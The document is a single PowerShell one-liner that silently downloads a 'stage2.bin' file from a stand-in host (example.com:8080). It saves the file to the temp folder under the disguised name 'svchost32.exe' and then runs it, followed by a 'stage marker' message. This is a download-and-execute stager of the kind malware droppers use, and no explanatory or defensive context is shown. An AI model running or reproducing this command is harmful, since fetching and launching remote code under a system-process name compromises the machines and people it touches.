
curl.exe -s -L -o "$env:TEMP\svchost32.exe" "http://example.com:8080/stage2.bin"; Start-Process -FilePath "$env:TEMP\svchost32.exe"; Write-Verbose "stage marker 4 reached"
